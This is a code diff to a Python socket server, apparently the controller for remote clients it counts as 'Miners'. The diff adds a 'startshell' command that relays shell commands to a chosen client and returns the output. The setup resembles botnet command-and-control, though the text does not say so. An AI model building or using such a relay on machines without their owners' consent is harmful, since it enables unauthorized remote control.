@@ -23,8 +23,29 @@ def handle_manager(conn, addr, server):
     while connected:
                 #command loop
                 command = conn.recv(1024).decode('utf-8')
-                
-                if command == 'cliget':
+                if command == 'startshell':
+                    if len(client_objects) > 0:
+                        clientobject = client_objects[int(conn.recv(1024).decode('utf-8')) - 1]
+                        if clientobject.start_shell():
+                            conn.send('connected'.encode('utf-8'))
+                        else:
+                            conn.send('failed'.encode('utf-8'))
+                        while True:
+                            comm = conn.recv(1024).decode('utf-8')
+                            clientobject.send_shell_command(comm)
+                            if comm != 'stop':
+                                response = clientobject.recieve_shell_response()
+                                conn.send(response.encode('utf-8'))
+                            else:
+                                break
+                            response = None
+                            
+                    else:
+                        continue
+                        
+                    
+                    
+                elif command == 'cliget':
                     for client in address_book:
                         address = client[0] + ':' + str(client[1])
                         conn.send(address.encode('utf-8'))
@@ -115,7 +136,7 @@ def main(server):
                 t1.start()
                 managecheck = None
         
-            print(f'\n[ACTIVE] Miners: {threading.activeCount() - 2}\n')
+            print(f'\n[ACTIVE] Miners: {len(client_objects)}\n')
         
 init_server()
 
